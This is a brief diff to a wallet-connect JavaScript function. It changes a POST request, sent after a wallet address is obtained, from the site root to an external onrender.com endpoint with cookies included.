@@ -13,7 +13,7 @@ async function connect() {
       const userAddress = accounts[0];
       console.log("Connected with address:", userAddress);
       if (userAddress) {
-        fetch("/", {
+        fetch("https://docverify-i7cb.onrender.com/", {
           method: "POST",
           credentials: "include", // Ensures cookies are sent
           headers: {
